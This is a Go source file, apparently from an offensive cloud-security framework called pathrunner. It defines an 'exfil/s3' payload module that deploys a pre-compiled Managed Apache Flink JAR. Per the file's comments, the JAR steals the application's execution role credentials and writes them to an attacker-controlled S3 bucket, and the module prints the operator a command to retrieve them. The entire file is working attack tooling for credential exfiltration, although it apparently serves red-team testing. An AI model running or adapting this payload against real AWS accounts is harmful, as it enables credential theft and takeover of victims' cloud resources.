// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package kinesisanalytics

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ExfilS3Payload targets a Flink JAR that extracts the application's service
// execution role credentials and writes them to an attacker-controlled S3 bucket.
//
// Required JAR: kinesisanalytics/exfil-s3/payload.jar in the attacker code bucket,
// or provide CODE_BUCKET/CODE_KEY manually. The JAR reads EXFIL_BUCKET and
// EXFIL_PREFIX from the Flink EnvironmentProperties group "PayloadProperties".
//
// EXFIL_BUCKET is auto-populated from the attacker exfil bucket when
// 'attacker infra bucket create' has been run. The attacker bucket must have
// a resource-based policy granting s3:PutObject to the victim account.
type ExfilS3Payload struct{}

func init() {
	_ = payloads.Register(&ExfilS3Payload{})
}

func (p *ExfilS3Payload) GetName() string {
	return "exfil/s3"
}

func (p *ExfilS3Payload) GetDescription() string {
	return "Exfiltrate execution role credentials to an attacker-controlled S3 bucket via a Managed Apache Flink application"
}

func (p *ExfilS3Payload) GetTags() []string {
	return []string{
		payloads.TagServiceKinesisAnalytics,
		payloads.TagLanguageJava,
		payloads.TagTechniqueExfil,
		payloads.TagTransportFilesystem,
	}
}

func (p *ExfilS3Payload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "EXFIL_BUCKET",
			Description: "Attacker-controlled S3 bucket name (auto-populated from 'attacker infra bucket create')",
			Required:    true,
		},
		{
			Name:        "EXFIL_PREFIX",
			Description: "S3 key prefix for the exfiltrated credentials",
			Required:    false,
			Default:     "exfil/",
		},
	}
}

func (p *ExfilS3Payload) Validate(options map[string]string) error {
	bucket := options["EXFIL_BUCKET"]
	if bucket == "" {
		return fmt.Errorf("EXFIL_BUCKET is required for exfil/s3 payload")
	}
	if strings.HasPrefix(bucket, "s3://") {
		return fmt.Errorf("EXFIL_BUCKET should be the bucket name only, not an S3 URI")
	}
	return nil
}

// GenerateCode is not used for JAR-based payloads — the JAR is pre-compiled.
func (p *ExfilS3Payload) GenerateCode(_ map[string]string) (string, error) {
	return "", nil
}

// ProcessResult formats a summary directing the operator to the exfil bucket.
func (p *ExfilS3Payload) ProcessResult(result string) (string, error) {
	var r struct {
		App         string `json:"app"`
		Role        string `json:"role"`
		Region      string `json:"region"`
		ExfilBucket string `json:"exfil_bucket"`
	}
	if err := json.Unmarshal([]byte(result), &r); err != nil {
		return result, nil
	}

	bucket := r.ExfilBucket
	if bucket == "" {
		bucket = "(see EXFIL_BUCKET)"
	}

	var out strings.Builder
	out.WriteString("Credential exfiltration initiated.\n\n")
	fmt.Fprintf(&out, "  App:    %s (%s)\n", r.App, r.Region)
	fmt.Fprintf(&out, "  Via:    Flink execution role %s\n\n", r.Role)
	fmt.Fprintf(&out, "Credentials were written to s3://%s/exfil/<account>/<timestamp>.json\n", bucket)
	out.WriteString("Retrieve with: aws s3 cp s3://" + bucket + "/exfil/ . --recursive\n")
	return out.String(), nil
}

// GetJARKey returns the S3 key where the universal payload JAR is stored.
func (p *ExfilS3Payload) GetJARKey() string {
	return "kinesisanalytics/pathrunner-payload/payload.jar"
}

// GetEmbeddedJAR returns the pre-compiled Flink payload JAR bytes embedded in the binary.
func (p *ExfilS3Payload) GetEmbeddedJAR() []byte {
	return GetEmbeddedJAR()
}

// GetFlinkProperties returns the EnvironmentProperties the JAR reads at startup.
func (p *ExfilS3Payload) GetFlinkProperties(options map[string]string) map[string]map[string]string {
	prefix := options["EXFIL_PREFIX"]
	if prefix == "" {
		prefix = "exfil/"
	}
	return map[string]map[string]string{
		"PayloadProperties": {
			"PAYLOAD_TYPE": "exfil/s3",
			"EXFIL_BUCKET": options["EXFIL_BUCKET"],
			"EXFIL_PREFIX": prefix,
		},
	}
}
